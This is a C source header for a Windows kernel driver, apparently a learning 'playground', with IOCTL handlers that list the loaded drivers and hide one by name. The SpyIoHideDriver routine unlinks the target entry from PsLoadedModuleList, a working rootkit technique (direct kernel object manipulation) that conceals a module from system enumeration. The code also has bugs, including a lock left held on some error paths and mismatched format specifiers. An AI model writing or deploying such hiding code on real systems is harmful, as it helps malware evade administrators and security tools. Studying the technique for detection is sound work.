#pragma once
#include "prototypes.h"
#include "common.h"

// ---------------------------------------------------------------
// IOCTL codes handler For driver playground
// ---------------------------------------------------------------

// List loaded drivers IOCTL handler
NTSTATUS SpyIoEnumerateLoadedDrivers(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] SpyIoEnumerateLoadedDrivers called\n");

    if (!PsLoadedModuleList) {
        DbgPrint("[-] PsLoadedModuleList is NULL\n");
        return STATUS_UNSUCCESSFUL;
    }

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    ULONG count = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;


    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "Loaded Kernel Drivers:\n\n");
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Header print failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }
    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

    PLIST_ENTRY head = PsLoadedModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head)
    {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        WCHAR nameW[260] = { 0 };

        if (entry->BaseDllName.Buffer) {
            USHORT len = entry->BaseDllName.Length;
            if (len > sizeof(nameW) - sizeof(WCHAR))
                len = sizeof(nameW) - sizeof(WCHAR);

            RtlCopyMemory(nameW, entry->BaseDllName.Buffer, len);
            nameW[len / 2] = L'\0';
        }
        else {
            RtlStringCbCopyW(nameW, sizeof(nameW), L"<unknown>");
        }

        status = RtlStringCbPrintfA(
            out + offset,
            outputLength - offset,
            "[%03lu] Base: 0x%p | Size: 0x%X | Name: %wS\n",
            count,
            entry->DllBase,
            entry->SizeOfImage,
            nameW
        );
        if (!NT_SUCCESS(status)) break;

        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) break;
        offset += (ULONG)writtenBytes;

        DbgPrint("[Windg] [%lu] 0x%p -> %wZ\n", count, entry->DllBase, &entry->BaseDllName);

        count++;
        current = current->Flink;

        if (offset >= outputLength - 200)
            break;
    }


    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "\nTotal drivers: %lu\n", count);
    if (NT_SUCCESS(status)) {
        if (NT_SUCCESS(RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes))) {
            offset += (ULONG)writtenBytes;
        }
    }

    *bytesReturned = offset;
    DbgPrint("[+] SpyIoEnumerateLoadedDrivers finished (%lu drivers, %lu bytes)\n", count, offset);

    return STATUS_SUCCESS;
}

// Hide driver IOCTL handler
NTSTATUS SpyIoHideDriver(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] SpyIoHideDriver called\n");

    if (!PsLoadedModuleList) {
        DbgPrint("[-] PsLoadedModuleList is NULL\n");
        return STATUS_UNSUCCESSFUL;
    }

    // get target driver name
    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
    char targetName[256] = { 0 };
    RtlCopyMemory(targetName, input->g_Name, sizeof(input->g_Name));
    DbgPrint("[*] Looking for driver: %s\n", targetName);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN found = FALSE;



    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Hiding Driver: %s\n\n", targetName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Header print failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

    // Lock the module list
    if (PsLoadedModuleResource) ExAcquireResourceExclusiveLite(PsLoadedModuleResource, TRUE);
    PLIST_ENTRY head = PsLoadedModuleList;
    PLIST_ENTRY current = head->Flink;

    // search in linked list for target driver
    while (head != current && current != NULL) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {

            // convert UNICODE_STRING to ANSI string
            ANSI_STRING ansiTarget;
            UNICODE_STRING unicodeTarget;
            RtlInitAnsiString(&ansiTarget, targetName);
            status = RtlAnsiStringToUnicodeString(&unicodeTarget, &ansiTarget, TRUE);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] RtlAnsiStringToUnicodeString failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }

            // check if this is the target driver
            if (RtlEqualUnicodeString(&entry->BaseDllName, &unicodeTarget, TRUE)) {

                DbgPrint("[+] Found target driver: %s at 0x%p\n", &entry->BaseDllName, entry->DllBase);
                found = TRUE;

                // append it to output
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Found target driver: %s -> 0x%p\n", &entry->BaseDllName, entry->DllBase);
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Found Driver print failed: 0x%X\n", status);
                    RtlFreeUnicodeString(&unicodeTarget);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;

                // Get prev and next
                PLIST_ENTRY prev = current->Blink;
                PLIST_ENTRY next = current->Flink;

                DbgPrint("[*] Unlinking driver...\n");
                DbgPrint("    Prev: 0x%p\n", prev);
                DbgPrint("    Current: 0x%p\n", current);
                DbgPrint("    Next: 0x%p\n", next);

                // append to output
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Unlinking driver...\n    Prev: 0x%p\n    Current: 0x%p\n    Next: 0x%p\n", prev, current, next);
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Unlinking print failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
                // Unlink from the list
                prev->Flink = next;
                next->Blink = prev;
                DbgPrint("[+] Driver unlinked successfully\n");

                // Point to self (optional cleanup)
                current->Flink = current;
                current->Blink = current;

                // append to output sucess message
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Driver unlinked successfully\n");
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Success print failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
                break;
            }
            RtlFreeUnicodeString(&unicodeTarget);
        }

        current = current->Flink;


    }

    // release lock
    if (PsLoadedModuleResource) ExReleaseResourceLite(PsLoadedModuleResource);

    if (!found) {
        DbgPrint("[-] Target driver not found: %s\n", targetName);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Target driver not found: %s\n", targetName);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[!] Not Found print failed: 0x%X\n", status);
            *bytesReturned = 0;
            return status;
        }
        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
        offset += (ULONG)writtenBytes;
    }
    *bytesReturned = offset;
    DbgPrint("[+] SpyIoHideDriver finished (%lu bytes)\n", offset);
    return STATUS_SUCCESS;
}